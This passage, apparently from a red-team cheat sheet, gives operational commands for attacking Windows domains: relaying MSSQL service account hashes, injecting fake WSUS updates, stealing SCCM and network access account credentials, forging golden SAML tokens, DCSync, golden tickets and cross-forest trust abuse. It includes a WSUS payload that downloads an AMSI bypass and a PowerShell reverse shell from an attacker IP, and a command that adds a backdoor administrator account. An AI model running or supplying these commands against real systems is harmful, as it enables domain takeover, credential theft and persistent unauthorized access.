Import-Module \Scripts\pending\Get-SQLServiceAccountPwHashes.ps1
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp <ATTACKER IP>
 

python smbrelayx.py -h <SQL SERVER IP> -c 'powershell empire launcher'
msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
set SMBPROXY <ATTACKER IP>
set RHOST <TARGET IP>
set GET_PATH <PATH TO SQLI>
run
```

### Data exfiltration
#### SQLServerPasswordHash
```
Get-SQLServerPasswordHash -Verbose -Instance <INSTANCE> -Migrate
```
 
#### Identify Sensitive Data
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
```
 
#### Identify sensitive data featuring transparent encryption
```
Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq 'TRUE'}| Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
```

### Query database 
```
Get-SQLQuery -Instance "<INSTANCE>" -Query "select @@servername"
Get-SQLQuery -Instance "<INSTANCE>" -Query "<QUERY>"
```

#### SQL Queries
```
#When able to connect directy to the instance
Get-SQLDatabase
Get-SQLTable
Get-SQLColumn
Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"

#Through links
List databases
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name

#List tables
Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery

#List columns

#List the contents of table
```
 
### SQL Queries
#### Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check if a user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
```

#### List all sysadmins
```
SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
```

## WSUS
- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!

### Enumeration
#### Identify usage of WSUS on hosts
- Can be executed on host to check if a wsus server is configured
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
```

### WSUS module
- https://learn.microsoft.com/en-us/powershell/module/updateservices/?view=windowsserver2022-ps
- Module is available on the WSUS server itself

#### Get information about the WSUS server
```
Get-WsusServer
```

#### Get information about the computers which uses WSUS
```
Get-WsusComputer
```

### Injecting fake update - MTM
- When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
- Requirements
  - WSUS without SSL encryption
  - Only deliver binaries signed by MS, such as psexec
  - Must perform arp spoofing or tamper with the system's proxy settings 
- https://github.com/ctxis/wsuspect-proxy
- https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf

#### Identify usage of WSUS
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
```

#### Retrieve WSUS URL
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

### Injecting fake update - ARP spoofing
- https://github.com/pimps/wsuxploit
- If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
  - https://github.com/evilsocket/bettercap 

### Inject fake update
```
.\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
```

### Injecting fake update - WPAD injection
#### Check if automatic detection of the proxy is performed
- If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
```
req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
```

### Injecting fake update - Access to WSUS server
- WSUS server is most likely be interconnected to servers containing sensitive information.
- After comprimising the WSUS server it might be possible to acces networks you weren't able before.
- Inject a fake update directory to the WSUS server
  - https://github.com/AlsidOfficial/WSUSpendu 

#### Update - Make new user
```
.\Wsuspendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user <USER> <PASSWORD> /add && net localgroup Administrators <USER> /add"' -ComputerName <COMPUTER>
```

#### Update - Rev shell
- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
```
.\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/Invoke-PowerShellTcp.ps1")'
```

#### Get unnaproved updates and approve them
```
Get-WsusUpdate -Approval Unapproved
Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
```

## SCCM
- SCCM talk Black Hills https://www.youtube.com/watch?v=W9PC9erm_pI
- SCCM Secrets
	- Network Access Account (NAA) (To join computers to the domain)
	- Client Push Installation Accounts (To push SSCM client to endpoints)
	- Operating System Deployment (OSD)
		- Collection variables
		- Account to write image to SMB share
		- Account to pull files from SMB share
		- Set local admin password
		- Run arbitrary command
		- Account to join the domain / Apply network settings

### Enumeration
#### Get SCCM server wmi
- Execute on enrolled SCCM client

```
Get-WmiObject -Class SMS_Authority -Namespace root\CCM
```

#### Get SSCM server ADSISearcher
```
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
```

#### SharpSCCM
- https://github.com/Mayyhem/SharpSCCM

```
.\SharpSCCM.exe local site-info
```

### sccmhunter
- https://github.com/garrettfoster13/sccmhunter

#### Find potential site servers
```
python3 sccmhunter.py find -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <FQDN DC>
```

- The SMB module takes the results from Find and enumerates the remote hosts SMB shares, SMB signing status, and checks if the server is running MSSQL. 
```
python3 sccmhunter.py smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <FQDN DC>
```

- The show module is intended simply to present the stored CSVs generated during running the find and smb modules.
```
python3 sccmhunter.py show -users
python3 sccmhunter.py show -computers
```

### PowerSCCM
- https://github.com/PowerShellMafia/PowerSCCM

#### Get site code
```
Find-SccmSiteCode -Computername <FQDN>
```

#### Get Site code locally
```
Find-LocalSccmInfo
```

#### Open a session
- If error `Error connecting to sccm.GiganticHosting.local\ via WMI ` try `-ConnectionType DB `
- Some commands require WMI, with enough permissions to WMI you can access (other user, or system on SSCM server for example)
```
$sess = New-SccmSession -ComputerName <FQDN> -SiteCode <SITECODE> -ConnectionType WMI
$sess = New-SccmSession -ComputerName <FQDN> -SiteCode <SITECODE> -ConnectionType DB
```

#### List sessions
```
Get-SccmSession
```

#### Close sessions
```
Remove-SccmSession -Session <ID>
```

#### Get user deployed applications
```
Get-SccmApplication -Session $sess
```

#### Network scan for SCCM ports
- `8530`, `8531`, `10123` Site Server, Management Point
- `49152-49159` Distribution Point
```
sudo nmap -p 8530, 8531, 10123, 49152-49159 -Pn <IP>
```

### Privilege Escalation
### Operating System Deployment
- Deploy image over PXE
- Role: Windows Deployment Services (WDS)
- PXE can be password protected
- https://github.com/MWR-CyberSec/PXEThief

### PXE without password
#### Check for no PXE password and extract credentials
```
python3 pxethief.py 1

python pxethief.py 2 <FQDN SCCM>
```

### PXE with password
#### Check for PXE with password
```
python pxethief.py 2 <FQDN SCCM>
```

#### Run the two tftp commands and retrieve files

#### Extract hash
```
python3 pxethief.py 5 <boot.var file>
```

#### Crack the hash
```
hashcat -a 0 -m 19850 <HASH FILE> <WORLDLIST>
```

#### Retrive credentials
```
python3 pxethief.py 3 <boot.var file> <PASSWORD>
```

### Network Access Account
- Account used to join to the domain.

#### Retrieve credentials
- Run on SCCM client and be local admin

- https://github.com/GhostPack/SharpDPAPI
```
.\SharpDPAPI.exe SCCM
```

- https://github.com/Mayyhem/SharpSCCM
```
.\SharpSCCM.exe get secrets
.\SharpSCCM.exe local secrets -m wmi
```

#### Retrieve credentials remotely
- https://github.com/fortra/impacket/blob/755efbffc7bd54c9dcf33d7c5e04038801fd3225/examples/SystemDPAPIdump.py
```
SystemDPAPIdump.py -creds -sccm '<DOMAIN>/<USER>:<PASSWORD>'@'<FQDN TARGET>'
```

### Retrieve credentials with machine account
- Requires adding a machine account

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py

```
Import-Module Powermad.ps1 
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Get naapolicy.xml
- Saves to `/tmp/naapolicy.xml`
```
python3 sccmwtf.py "FAKE01" "FAKE01.<FQDN DOMAIN>" '<SCCM SERVER>' '<FQDN DOMAIN>\FAKE01$' '123456'
```

#### Decrypt from Windows machine
- `cat /tmp/naapolicy.xml`
```
sccm-decrypt.exe <blox hex 1>
sccm-decrypt.exe <blox hex 2>
```

### Retrieve credentials with Ntlmrelayx
- Usefull when unable to create machine accounts
- Only SMB machine account NetNTLMV2

#### Turn of SMB and HTTP
```
nano Responder.conf
```

#### Turn on Responder
- For poisoning
```
Responder -I eth0
```

#### Run NTLMRelayx.py
```
ntlmrelayx.py -t http://<FQDN SCCM MACHINE>/ccm_system_windowsauth/request --sccm --sccm-device test1 --sccm-fqdn <FQDN SCCM MACHINE> --sccm-server <SCCM MACHINE SAMACCOUNTNAME> --sccm-sleep 10 -smb2support
```

#### Trigger target to authenticate to attacker machine
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME>.<DOMAIN>

python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <TARGET>
```

#### Decrypt from Windows machine
- `cat naapolicy.xml`
```
sccm-decrypt.exe <blox hex 1>
sccm-decrypt.exe <blox hex 2>
```

### Client Push Installation Accounts
- Misconfigurations:
	- Automatic Site-Wide Client Push Installation
	- Allow Connection Fallback to NTLM
- Force client push by breaking domain trust	

### Client push via breaking domain trust
- Requires able to join computers to the domain

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

#### Join domain & break trust
1. Create Windows Machine and Join the Domain
2. Open PowerShell as the account used to join the domain.
3. List and Delete spn
```
setspn -L <MACHINE NAME>
setspn -D host/<MACHINE NAME>
setspn -d host/<MACHINE FQDN>
```
4. Reboot the machine
5. Turn off Windows Firewall for all profiles

#### Delete local administrators
```
net localgroup administrators
net localgroup administrators "<DOMAIN>\Domain Admins" /del
net localgroup administrators "<DOMAIN>\...." /del
```

#### Run Inveigh
- https://github.com/Kevin-Robertson/Inveigh
```
Import-Module Inveigh.ps1

Invoke-Inveigh -ConsoleOutput Y -MachineAccounts Y
```

#### Crack the hash
```
hashcat -a 0 -m 5600 <HASH FILE> <WORLDLIST>
```

### Client push on Demand
- SMB signing needs to be disabled on target
#### Check local admin
- Run on an compromised machine(s)
- Check if the SCCM machine account or client push account is local admin
```
net localgroup administrators
```

#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Start ntlmrelayx
```
python3 ntlmrelayx.py -t <TARGET IP> -smb2support -of logs
```

#### Force client push
- On compromised machine
```
SharpSCCM_merged.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>
```

#### Crack the hash
```
hashcat -a 0 -m 5600 <HASH FILE> <WORLDLIST>
```

### Client push account is the SSCM server machine account
- SMB signing needs to be disabled on target
- Requires SCCM machine account to be local admin on target

#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Check local admin
- Run on an compromised machine(s)
- Check if the SCCM machine account or client push account is local admin
```
net localgroup administrators
```

#### Start ntlmrelayx
```
python3 ntlmrelayx.py -t <TARGET IP> -smb2support -socks
```

#### Trigger target to authenticate to attacker machine
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 printerbug.py <DOMAIN>/<USER>@<SCCM MACHINE> <HOSTNAME>.<DOMAIN>

python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
```

#### Change socks proxy
```
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

#### Run secretsdump or any impacket
- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
```
proxychains python3 secretsdump.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET>
```

### SCCM Compromise via Machine account relay to MSSQL
- Site server requires administrative rights on the SQL Server and management point computers
- Requirements
	- Low priv account
	- Requires SQL Server on a seperate host for relaying
	- Relaying SMB requires SMB signing

#### Retrieve the sid of low priv account
```
Get-DomainUser | Select-Object samaccountname, objectsid
```

#### Convert SID to HEX
```
nano sid.py

from impacket.ldap import ldapbytes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('<SID>')
print('0x' + ".join('{02x}'.format(b) for b in sid.GetData()))

python3 sid.py
```

#### Start ntlmrelayx
```
python3 ntlmrelayx.py -t "mssql://<TARGET IP>" -smb2support -socks
```

#### Trigger target to authenticate to attacker machine
- https://github.com/Mayyhem/SharpSCCM
- https://github.com/topotam/PetitPotam

```
.\SharpSCCM.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>

python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
```

#### Change socks proxy
```
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

#### Run mssqlclient.py from impacket
- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
```
proxychains python3 mssqlclient.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET> -windows-auth -no-pass
```

#### Execute SQL commands
- https://github.com/garrettfoster13/sccmhunter
- Sccmhunter have a handy auto generate commands function
```
python3 sccmhunter.py mssql -d <DOMAIN> -dc-ip <DC IP> -tu <USER NAME> -sc <SCCM SITE> -u <USER NAME> -p <PASSWORD>
```

```
use CM_<site_code>

INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,’<DOMAIN\user>',0,0,'','','','','<site_code>');

SELECT AdminID,LogonName FROM RBAC_Admins;

INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');
```

#### Verify that we are admin
- Must be from an SCCM client machine
```
.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```

### SCCM Compromise via Machine account relay to SMB
- Site server requires administrative rights on the SQL Server and management point computers
- Requirements
	- Low priv account
	- Requires SQL Server on a seperate host for relaying
	- Relaying SMB requires SMB signing

#### Start ntlmrelayx
```
python3 ntlmrelayx.py -t "<TARGET IP>" -smb2support -socks
```

#### Trigger target to authenticate to attacker machine
- https://github.com/Mayyhem/SharpSCCM
- https://github.com/topotam/PetitPotam

```
.\SharpSCCM.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>

python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
```

#### Change socks proxy
```
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

#### Run secretsdump or any impacket
- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
```
proxychains python3 secretsdump.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET>
```

### Lateral Movement
### Push application
#### Get computers to move laterally to
```
Get-SccmComputer -Session $sess
```

#### Create a computer collection
```
New-SccmCollection -Session $sess -CollectionName "MS Teams" -CollectionType "Device"
```

#### Add computers to the collection
```
Add-SccmDeviceToCollection -Session $sess -ComputerNameToAdd "<TARGET NAME>" -CollectionName "MS Teams"
```

#### Create an application to deploy
```
New-SccmApplication -Session $sess -ApplicationName "Teams" -PowerShellB64 "<powershell_script_in_Base64>"
```

#### Create an application deployment with the application and the collection previously created
```
New-SccmApplicationDeployment -Session $sess -ApplicationName "Teams" -AssignmentName "Push Teams" -CollectionName "MS Teams"
```

#### Force the machine in the collection to check the application update (and force the install)
```
Invoke-SCCMDeviceCheckin -Session $sess -CollectionName "MS Teams"
```

### Push script
- https://github.com/PowerShellMafia/PowerSCCM/pull/6
#### Get computers to move laterally to
```
Get-SccmComputer -Session $sess
```

#### Push script
```
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '<SCCM FQDN>' -TargetDevice '<TARGET NAME>' -Path '<SCRIPT>' -ScriptName 'Push MS Teams'
```

### Misc
### MalSCCM
- https://github.com/nettitude/MalSCCM
- Not final, didn't work inside the lab when I tried.

#### Locate SCCM Primary/Management Servers
```
./MalSCCM.exe locate
```

#### Compromise management server, use locate to find primary server
```
./MalSCCM.exe locate
```

#### Get information
```
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers
MalSCCM.exe inspect /primaryusers
MalSCCM.exe inspect /groups
```

## ADFS
- https://github.com/mandiant/ADFSDump
- https://github.com/szymex73/ADFSpoof

#### Dump ADFS secrets
- Requires to be ran from the ADFS service account on the ADFS server.
```
.\ADFSDump.exe
```

#### Save & trim output
- Save the `Private key` as `DKMkey.txt` and `Encrypted token` as `TKSKey.txt`
```
cat TKSKey.txt | base64 -d > TKSKey.bin
cat DKMkey.txt | tr -d "-" | xxd -r -p > DKMkey.bin
```

#### Create golden SAML token for another service
- Example command! Most info is extracted from the ADFSDump
```
python3 ADFSpoof.py -b TKSKey.bin DKMkey.bin -s adfs.<DOMAIN>.local saml2 --endpoint 'https://servicedesk.<DOMAIN>.local/SamlResponseServlet' --nameidformat 'urn:oasis:names:tc:SAML:2.0:nameid-format:transient' --nameid '<DOMAIN>\<USER TO IMPERSONATE>' --rpidentifier 'ME_29472ca9-86f2-4376-bc09-c51aa974bfef' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"><AttributeValue><DOMAIN>\<USER TO IMPERSONATE></AttributeValue></Attribute>'
```

#### Inject golden SAML token
- Intercept with burp and inject inside SAMLResponse.

## Pre Windows 2000 computers
- Check the [Initial Access page](Initial-Access.md#pre-windows-2000-computers)

### Azure AD
#### Enumerate where PHS AD connect is installed
```
Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
```

#### On the AD connect server extract MSOL_ Credentials
- [Azure page](/cloud/azure/Cloud-OnPrem-lateral-movement.md#azure-ad-connect)

#### Run cmd as MSOL_
```
runas /user:<DOMAIN>\<USER> /netonly cmd
```

#### Execute DCSync
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

## Child to Parent
### Kerberos
- Anything related to Kerberos and users/groups etc could be performed from child to parent. Things like Roasting, password in description, anything related to attributes, ACL's etc etc!
- Use the `-Domain` flag in PowerView to query stuff cross domain/forest.

### Trust key
- Abuses SID History
- Requires `Domain Admin` privileges in child domain.

#### Dump trust keys
- Look for in trust key from child to parent (first command)
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create an inter-realm TGT
- Uses well know Enterprise Admins SIDS
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
```

#### Create a TGS using Rubeus and inject current Powershell session
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
```

#### Check access on target machine
```
ls \\<FQDN>\c$
Enter-PSSession -ComputerName <FQDN>
 .\PsExec64.exe \\<COMPUTERNAME> cmd
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Krbtgt hash
- Abuses SID History
- Requires `Domain Admin` privileges in child domain.

#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername <DC>
```

#### Create TGT and inject in current session
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
- Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
- Remove ```/ptt``` to save ticket to file
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
```
 
- *Opsec way*
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
```

#### Check access on target machine
```
ls \\<FQDN>\c$
Enter-PSSession -ComputerName <FQDN>
 .\PsExec64.exe \\<COMPUTERNAME> cmd
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

## Cross forest attacks
- Great blogpost to abuse non-transitive https://exploit.ph/external-trusts-are-evil.html
	
### One-way Outbound
- With a One-Way Outbound trust from A --> B. Then B can enumerate users in A. If we are in domain A, its by design we can't access B.
- Can still be exploited and obtain "domain user" access from A to B by using shared credential. (Using the user A$ in domain B). It uses the flatname that is infront of the <DOMAIN>\<USER> format.

#### Dump trust keys
```
mimikatz lsadump::trust /patch
```

#### Request TGT
- Change the A$
```
.\Rubeus.exe asktgt /user:<FLATNAME>$ /domain:<FQDN DOMAIN> /rc4:<TRUST KEY RC3> /nowrap
```

#### Then inject TGT and you can enumerate the other domain for kerberos vulnerabilities etc.

### Printer bug2
-  It also works across a Two-way forest trust if TGT Delegation is enabled!

#### Check if TGTDelegation is enabled (run on DC)
```
netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
```

See [Printer Bug](#Printer-bug) for exploitation

### Trust key2
-  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
-  There is no way to enumerate which resources are shared.

#### Dump trust keys
- Look for in trust key from child to parent (first command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SIDS> /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Check access to server
```
dir \\<SERVER NAME>\<SHARE>\
```

### SID history enabled
- This is fine but why can't we access all resources just like Intra forest?
- SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
- This means, if we have an external trust (or a forest trust with SID history enabled /enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. 

#### Enumerate if SIDFilteringForestAware is enabled
- Run on the DC.
- `SIDFilteringForestAware` is set to True, it means SIDHistory is enabled across the forest trust.
```
Get-ADTrust -Filter *
```

#### Enumerate groups of the target forest with SID higher then 1000
```
Get-ADGroup -Filter 'SID -ge "<TARGET FOREST SID>-1000"' -Server <TARGET FOREST>
```
 
#### Get trust key
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
 
#### Get domain SID
```
Get-DomainSID
```
 
#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Use the TGS and execute DCsync or psremoting etc!

## Foreign Security Principals
- A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).

#### Enumerate users who are in groups outside of the user’s current domain
```
Get-DomainForeignUser 
ConvertFrom-SID <SID>
```

#### Enumerates group in the target domain that contain users/groups who are not in the target domain.
```
Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
ConvertFrom-SID <SID>
```
 
### Hop trust
- Easiest way is to use the username/password to start a new powershell session or do a runas.
- If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.
 
#### Create TGT
```
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap
```
 
#### Request a referral ticket
- from the current domain, for the target domain.
```
.\Rubeus.exe asktgs /service:krbtgt/<EXTERNAL FQDN> /domain:<FQDN> /dc:<DC FQDN> /ticket:<BASE64 TICKET> /nowrap
```
 
#### Request TGS
```
.\Rubeus.exe asktgs /service:cifs/<EXTERNAL FQDN> /domain:<EXTERNAL FQDN> /dc:<EXTERNAL DC FQDN> /ticket:<BASE64 TICKET> /nowrap
```
 
#### Write ticket to file
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("<BASE64 TICKET>"))
```
 
#### Then inject and use the ticket
```
.\Rubeus.exe /ticket:<TICKET BASE64>
.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
```
 
## ACLS
- Access to resources in a forest trust can also be provided without using FSPs using ACLs.
```
Find-InterestingDomainAcl -Domain <TRUST FOREST>
```
- Abuse ACL to other forest.

## Pam Trust
- PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
